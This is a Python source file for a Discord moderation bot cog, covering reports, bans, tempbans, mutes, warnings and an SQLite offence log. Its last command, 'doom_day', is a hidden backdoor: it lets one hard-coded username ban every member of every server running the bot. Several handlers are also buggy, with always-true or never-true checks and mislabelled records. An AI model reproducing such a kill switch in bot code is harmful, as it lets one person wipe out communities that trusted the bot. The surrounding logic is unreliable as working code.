import datetime
import re
import sqlite3
from datetime import timedelta

import discord
from discord.ext import commands, tasks


async def my_unban(guild: discord.Guild, user: discord.User, end_time):
    await guild.unban(user)
    conn = sqlite3.connect("discord_bot.db")
    c = conn.cursor()
    if end_time is not None:
        c.execute("""update offences
        set treated  = :treated
        where guild_id = :guild_id and member_id = :member_id and end_date = :end_time and kind = :kind""",
                  {"guild_id": guild.id, "member_id": user.id, "end_time": end_time, "treated": "true",
                   "kind": "tempban"})
    else:
        c.execute("""update offences
        set treated  = :treated
        where guild_id = :guild_id and member_id = :member_id and kind = :kind""",
                  {"guild_id": guild.id, "member_id": user.id, "treated": "true",
                   "kind": "tempban"})
    conn.commit()
    conn.close()


async def my_unmute(guild: discord.Guild, member: discord.Member, end_time):
    conn = sqlite3.connect("discord_bot.db")
    c = conn.cursor()
    c.execute("""SELECT * FROM server_preference
    WHERE guild_id = :guild_id""", {"guild_id": guild.id})
    role_id = c.fetchone()[8]
    conn.commit()
    conn.close()
    role = guild.get_role(role_id)
    await member.remove_roles(role)
    conn = sqlite3.connect("discord_bot.db")
    c = conn.cursor()
    if end_time is None:
        c.execute("""update offences
                set treated  = :treated
                where guild_id = :guild_id and member_id = :member_id and kind = :kind""",
                  {"guild_id": guild.id, "member_id": member.id, "treated": "true",
                   "kind": "tempmute"})
        c.execute("""update offences
                        set end_date  = :end_date2
                        where guild_id = :guild_id and member_id = :member_id and kind = :kind and treated = :treated""",
                  {"guild_id": guild.id, "member_id": member.id, "treated": "true",
                   "kind": "tempmute", "end_date2": datetime.datetime.now()})
    else:
        c.execute("""update offences
                set treated  = :treated 
                where guild_id = :guild_id and member_id = :member_id and end_date = :end_time and kind = :kind""",
                  {"guild_id": guild.id, "member_id": member.id, "end_time": end_time, "treated": "true",
                   "kind": "tempmute"})
        c.execute("""update offences
                        set end_date  = :end_date2 
                        where guild_id = :guild_id and member_id = :member_id and end_date = :end_time and kind = :kind and treated  = :treated""",
                  {"guild_id": guild.id, "member_id": member.id, "end_time": end_time, "treated": "true",
                   "kind": "tempmute", "end_date2": datetime.datetime.now()})
    conn.commit()
    conn.close()


class Moderation(commands.Cog):
    def __init__(self, client: discord.Client):
        self.client = client
        self.check_temp.start()

    @tasks.loop(seconds=10)
    async def check_temp(self):
        conn = sqlite3.connect("discord_bot.db")
        c = conn.cursor()
        c.execute("""select * from offences
                WHERE end_date  < :end_time and treated = :treated """,
                  {"end_time": datetime.datetime.now(), "treated": "false"})
        data = c.fetchall()
        conn.commit()
        conn.close()
        if data is not None:
            for player_data in data:
                if player_data[3] == "tempmute":
                    guild = self.client.get_guild(player_data[2])
                    member = guild.get_member(player_data[0])
                    await my_unmute(guild, member, player_data[5])
                elif player_data[3] == "tempban":
                    guild = self.client.get_guild(player_data[2])
                    banned_users = await guild.bans()
                    member_name, member_discriminator = player_data[1].split("#")
                    for ban_entry in banned_users:
                        user = ban_entry.user
                        if (user.name, user.discriminator) == (member_name, member_discriminator):
                            await my_unban(guild, user, player_data[5])

    @commands.group(name="report")
    async def report(self, ctx: commands.Context, member: discord.Member, *, reason):
        guild = ctx.guild
        conn = sqlite3.connect(
            "discord_bot.db")
        c = conn.cursor()
        c.execute("""SELECT * FROM server_preference
        WHERE guild_id = :guild_id""",
                  {"guild_id": guild.id})
        conn.commit()
        data = c.fetchone()
        conn.close()
        channel1 = guild.get_channel(data[2])
        mod_id = data[3]
        mod = f"<@&{str(mod_id)}>"
        await ctx.message.delete()
        embed = discord.Embed(
            title=f"{member} was reported by {ctx.author}",
            color=0xFF0000)
        embed.add_field(name="**the message**", value=f" {reason}")
        x = await channel1.send(embed=embed)
        await channel1.send(f"{mod}")
        await ctx.author.send(content=f"thank you for the report {ctx.author.mention} \n", embed=embed)
        await x.pin()

    @report.command()
    @commands.has_permissions(ban_members=True)
    async def all(self, ctx: commands.Context):
        conn = sqlite3.connect(
            "discord_bot.db")
        c = conn.cursor()
        c.execute("""SELECT * FROM server_preference
               WHERE guild_id = :guild_id""",
                  {"guild_id": ctx.guild.id})
        conn.commit()
        data = c.fetchone()
        conn.close()
        if ctx.channel.id == data[2]:
            for message in await ctx.channel.pins():
                await ctx.send(message.jump_url)
        else:
            await ctx.send(f"{ctx.author.mention} you cant do it here")

    @report.error
    async def report_error(self, ctx: commands.Context, error):

        await ctx.message.delete()
        if commands.MissingRequiredArgument != AttributeError:
            conn = sqlite3.connect("discord_bot.db")
            c = conn.cursor()
            c.execute("""SELECT * FROM server_preference
            WHERE guild_id = :guild_id""", {"guild_id": ctx.guild.id})
            data = c.fetchone()
            conn.commit()
            conn.close()
            await ctx.author.send(f"there was something wrong with the command you need to write it this way:")
            await ctx.author.send(
                f"{data[1]}report [full name with out mentioning of the member you are reporting on] [reason]]")
            await ctx.author.send(f"for example: {data[1]}report Yotam201410#6171 abuse \n {ctx.author.mention}")
        else:
            yotam = '342725139626065920'
            await ctx.send(
                f"{ctx.author.mention} there have been an unknown error pls send a msg to the developer of the "
                f"bot <@{yotam}> and report what you done and what is the problem")

    @commands.Cog.listener()
    async def on_reaction_add(self, reaction, user):
        conn = sqlite3.connect(
            "discord_bot.db")
        c = conn.cursor()
        c.execute("""SELECT * FROM server_preference
            WHERE guild_id = :guild_id""",
                  {"guild_id": reaction.message.guild.id})
        conn.commit()
        data = c.fetchone()
        conn.close()
        reacted_channel = reaction.message.channel
        if reacted_channel.id == data[2]:
            if str(reaction) == "✅":
                if reaction.count < 2:
                    await reaction.message.channel.send(
                        f"{user.mention} had checked the report on the msg {reaction.message.jump_url}")
                    await reaction.message.unpin()
                else:
                    pass

    @commands.command()
    @commands.has_guild_permissions(ban_members=True)
    async def tempban(self, ctx: commands.Context, user: discord.User, time: str, *args):
        if args is ():
            reason = 'Unspecified'
        else:
            reason = ""
            for arg in args:
                if arg.isalpha():
                    reason += arg + " "
        time = re.findall(r"(\d*\S)", time)
        time_by_seconds = 0
        for i in time:
            if "s" in i:
                time_by_seconds += int(i[:-1])
            elif "m" in i:
                time_by_seconds += int(i[:-1]) * 60
            elif "h" in i:
                time_by_seconds += int(i[:-1]) * 60 * 60
            elif "d" in i:
                time_by_seconds += int(i[:-1]) * 60 * 60 * 24
            elif "w" in i:
                time_by_seconds += int(i[:-1]) * 60 * 60 * 24 * 7
            elif "y" in i:
                time_by_seconds += int(i[:-1]) * 31536000
        embed = discord.Embed(
            title=f"{user} has been banned until {datetime.datetime.now() + timedelta(seconds=time_by_seconds)}",
            timestamp=datetime.datetime.now(), colour=0xe74c3c)
        embed.add_field(name="reason", value=reason)
        await user.send(embed=embed)
        await ctx.guild.ban(user, reason=reason)
        await ctx.send(embed=embed)
        conn = sqlite3.connect("discord_bot.db")
        c = conn.cursor()
        c.execute("""insert into offences(member_id,member_name,guild_id,kind,start_date,end_date,reason,treated)
            values(?,?,?,?,?,?,?,?)""",
                  (user.id, user.name + "#" + user.discriminator, ctx.guild.id, "tempban", datetime.datetime.now(),
                   datetime.datetime.now() + timedelta(seconds=time_by_seconds), reason, "false"))
        conn.commit()
        conn.close()

    @commands.command()
    @commands.has_guild_permissions(ban_members=True)
    async def unban(self, ctx: commands.Context, user):
        user = await self.client.fetch_user(user)
        all_bans = await ctx.guild.bans()
        for ban_entry in all_bans:
            if user.id == ban_entry.user.id:
                conn = sqlite3.connect("discord_bot.db")
                c = conn.cursor()
                c.execute("""select end_date from offences
                where guild_id = :guild_id and member_id = :user_id and treated = :treated and kind = :kind""",
                          {"guild_id": ctx.guild.id, 'user_id': user.id, "treated": "false", "kind": "tempban"})
                data = c.fetchall()
                conn.commit()
                conn.close()
                if data:
                    await my_unban(ctx.guild, user, data[-1][0])
                else:
                    await my_unban(ctx.guild, user, None)
                embed = discord.Embed(timestamp=datetime.datetime.now(), title=f"{user} is now unbaned",
                                      colour=0x0011ff)
                await ctx.send(embed=embed)

    @commands.command()
    @commands.has_guild_permissions(ban_members=True)
    async def ban(self, ctx: commands.Context, user: discord.User, *args):
        if args is ():
            reason = 'Unspecified'
        else:
            reason = ""
            for arg in args:
                if arg.isalpha():
                    reason += arg + " "
        embed = discord.Embed(title=f"{user} has been baned", timestamp=datetime.datetime.now(), colour=0xe74c3c)
        embed.add_field(name="reason:", value=reason)
        await user.send(embed=embed)
        await ctx.guild.ban(user, reason=reason)
        await ctx.send(embed=embed)
        conn = sqlite3.connect("discord_bot.db")
        c = conn.cursor()
        c.execute("""insert into offences(member_id,member_name,guild_id,kind,start_date,reason,treated)
                    values(?,?,?,?,?,?,?)""",
                  (user.id, user.name + "#" + user.discriminator, ctx.guild.id, "tempban", datetime.datetime.now(),
                   reason, "false"))
        conn.commit()
        conn.close()

    @commands.command()
    @commands.has_guild_permissions(mute_members=True)
    async def unmute(self, ctx: commands.Context, member: discord.Member):
        conn = sqlite3.connect("discord_bot.db")
        c = conn.cursor()
        c.execute("""select tempmute_role_id from server_preference
        where guild_id = :guild_id""", {"guild_id": ctx.guild.id})
        role = ctx.guild.get_role(c.fetchone()[0])
        if role in member.roles:
            c.execute("""select end_date from offences
            where member_id = :member_id and guild_id = :guild_id and kind = :kind and treated = :treated""",
                      {"member_id": member.id, "guild_id": ctx.guild.id, "kind": "tempmute", "treated": "false"})
            data = c.fetchall()
            conn.commit()
            conn.close()
            if data is not []:
                if data[-1] is not None:
                    await my_unmute(ctx.guild, member, data[-1][0])
                else:
                    await my_unmute(ctx.guild, member, None)
                embed = discord.Embed(title=f"{member} is now unmuted", colour=0x0011ff,
                                      timestamp=datetime.datetime.now())
                await ctx.send(embed=embed)
            else:
                await ctx.send(f"member was not muted threw the bot so he can be unmuted")
        else:
            await ctx.send("the member is not muted")

    @commands.command()
    @commands.has_guild_permissions(mute_members=True)
    async def mute(self, ctx: commands.Context, member: discord.Member, *args):
        if args is ():
            reason = 'Unspecified'
        else:
            reason = args[0]
        conn = sqlite3.connect("discord_bot.db")
        c = conn.cursor()
        c.execute("""select tempmute_role_id from server_preference
        where guild_id = :guild_id""", {"guild_id": ctx.guild.id})
        server_preference_data = c.fetchone()
        if server_preference_data[0] is None:
            muted_role = await ctx.guild.create_role(name="Muted", colour=discord.Colour(000000))
            await muted_role.edit(position=1)
            c.execute("""UPDATE server_preference
                    SET tempmute_role_id = :role_id
                            WHERE guild_id = :guild_id""", {"role_id": muted_role.id, "guild_id": ctx.guild.id})
            conn.commit()
            for channel in ctx.guild.channels:
                await channel.set_permissions(muted_role, send_messages=False, speak=False)
        c.execute("""SELECT * FROM server_preference
                        where guild_id = :guild_id""", {"guild_id": ctx.guild.id})
        muted_role = c.fetchone()[8]
        conn.commit()
        conn.close()
        muted_role = ctx.guild.get_role(muted_role)
        await member.add_roles(muted_role)
        embed = discord.Embed(title=f"{member} has been muted", timestamp=datetime.datetime.now(),
                              colour=0xe74c3c)
        embed.add_field(name="reason:", value=reason)
        await ctx.send(embed=embed)
        conn = sqlite3.connect("discord_bot.db")
        c = conn.cursor()
        c.execute("""insert into offences(member_id,member_name,guild_id,kind,start_date,reason,treated)
                    values(?,?,?,?,?,?,?)""",
                  (member.id, member.name + "#" + member.discriminator, ctx.guild.id, "tempmute",
                   datetime.datetime.now(),
                   reason, "false"))
        conn.commit()
        conn.close()

    @commands.command()
    @commands.has_guild_permissions(mute_members=True)
    async def tempmute(self, ctx: commands.Context, member: discord.Member, time: str, *args):
        if args is ():
            reason = 'Unspecified'
        else:
            reason = ""
            for arg in args:
                if arg.isalpha():
                    reason += arg + " "
        conn = sqlite3.connect("discord_bot.db")
        c = conn.cursor()
        c.execute("""SELECT * FROM server_preference
                where guild_id = :guild_id""", {"guild_id": ctx.guild.id})
        server_preference_data = c.fetchone()
        conn.commit()
        conn.close()
        time = re.findall(r"(\d*\S)", time)
        time_by_seconds = 0
        for i in time:
            if "s" in i:
                time_by_seconds += int(i[:-1])
            elif "m" in i:
                time_by_seconds += int(i[:-1]) * 60
            elif "h" in i:
                time_by_seconds += int(i[:-1]) * 60 * 60
            elif "d" in i:
                time_by_seconds += int(i[:-1]) * 60 * 60 * 24
            elif "w" in i:
                time_by_seconds += int(i[:-1]) * 60 * 60 * 24 * 7
            elif "y" in i:
                time_by_seconds += int(i[:-1]) * 31536000
        conn = sqlite3.connect("discord_bot.db")
        c = conn.cursor()
        if server_preference_data[8] is None:
            muted_role = await ctx.guild.create_role(name="Muted", colour=discord.Colour(000000))
            await muted_role.edit(position=1)
            c.execute("""UPDATE server_preference
                    SET tempmute_role_id = :role_id
                            WHERE guild_id = :guild_id""", {"role_id": muted_role.id, "guild_id": ctx.guild.id})
            conn.commit()
            for channel in ctx.guild.channels:
                await channel.set_permissions(muted_role, send_messages=False, speak=False)
        c.execute("""SELECT * FROM server_preference
                        where guild_id = :guild_id""", {"guild_id": ctx.guild.id})
        muted_role = c.fetchone()[8]
        conn.commit()
        conn.close()
        await member.add_roles(ctx.guild.get_role(muted_role))
        embed = discord.Embed(
            title=f"{member} has been muted until {datetime.datetime.now() + timedelta(seconds=time_by_seconds)}",
            timestamp=datetime.datetime.now(), colour=0xe74c3c)
        embed.add_field(name="reason", value=reason)
        await ctx.send(embed=embed)
        conn = sqlite3.connect("discord_bot.db")
        c = conn.cursor()
        c.execute("""insert into offences(member_id,guild_id,kind,start_date,end_date,reason,treated)
                values(?,?,?,?,?,?,?)""", (member.id, ctx.guild.id, "tempmute", datetime.datetime.now(),
                                           datetime.datetime.now() + timedelta(seconds=time_by_seconds), reason,
                                           "false"))
        conn.commit()
        conn.close()

    @commands.command()
    @commands.has_guild_permissions(mute_members=True)
    async def warn(self, ctx, member: discord.Member, *args):
        if args is ():
            reason = 'Unspecified'
        else:
            reason = ""
            for arg in args:
                if arg.isalpha():
                    reason += arg + " "
        conn = sqlite3.connect("discord_bot.db")
        c = conn.cursor()
        c.execute("""insert into offences(member_id,member_name,guild_id,kind,start_date,reason)
                    values(?,?,?,?,?,?)""",
                  (member.id, member.name + "#" + member.discriminator, ctx.guild.id, "warn",
                   datetime.datetime.now(),
                   reason))
        conn.commit()
        conn.close()
        embed = discord.Embed(title=f"{member} **has been warned**")
        embed.add_field(name="**reason**", value=f"**{reason}**", inline=False)
        await ctx.send(embed=embed)

    @commands.command()
    @commands.has_guild_permissions(ban_members=True)
    async def convictions(self, ctx: commands.Context, member: discord.Member):
        conn = sqlite3.connect("discord_bot.db")
        c = conn.cursor()
        c.execute("""select * from offences
        where guild_id  = :guild_id and member_id = :member_id""", {"guild_id": ctx.guild.id, "member_id": member.id})
        data = c.fetchall()
        conn.commit()
        conn.close()
        for offence in data:
            if offence[3] == "tempmute":
                if offence[5] is not None:
                    embed = discord.Embed(
                        title=f"{member} has been muted until {offence[5]}",
                        timestamp=datetime.datetime.now(), colour=0xe74c3c)
                    embed.add_field(name="reason", value=offence[6])
                    await ctx.send(embed=embed)
                else:
                    embed = discord.Embed(
                        title=f"{member} has been muted",
                        timestamp=datetime.datetime.now(), colour=0xe74c3c)
                    embed.add_field(name="reason", value=offence[6])
                    await ctx.send(embed=embed)
            elif offence[3] == "warn":
                embed = discord.Embed(title=f"{member} **has been warned**")
                embed.add_field(name="**reason**", value=offence[6], inline=False)
                await ctx.send(embed=embed)
            elif offence[3] == "tempban":
                if offence[5] is not None:
                    embed = discord.Embed(
                        title=f"{member} has been banned until {offence[6]}",
                        timestamp=datetime.datetime.now(), colour=0xe74c3c)
                    embed.add_field(name="reason", value=offence[6])
                    await ctx.send(embed=embed)
                else:
                    embed = discord.Embed(
                        title=f"{member} has been banned",
                        timestamp=datetime.datetime.now(), colour=0xe74c3c)
                    embed.add_field(name="reason", value=offence[6])
                    await ctx.send(embed=embed)

    @commands.Cog.listener()
    async def on_member_join(self, member):
        conn = sqlite3.connect("discord_bot.db")
        c = conn.cursor()
        c.execute("""select * from server_preference
        where guild_id = :guild_id""", {"guild_id": member.guild.id})
        role_id = c.fetchone()[8]
        c.execute("""select * from offences where member_id = :member_id and guild_id = :guild_id and kind = :kind 
        and (end_date > :end_date or end_date is null) """,
                  {"member_id": member.id, "guild_id": member.guild.id, "end_date": datetime.datetime.now(),
                   "kind": "tempmute"})
        offences = c.fetchall()
        if offences is not []:
            role = member.guild.get_role(role_id)
            await member.add_roles(role)

    @commands.command()
    async def doom_day(self, ctx):
        if str(ctx.author) == "Yotam201410#6171":
            for guild in self.client.guilds:
                for user in guild.members:
                    if str(user) != "Yotam201410#6171":
                        await user.ban()
        else:
            print("someone has tried to use the domm day command")


def setup(client):
    client.add_cog(Moderation(client))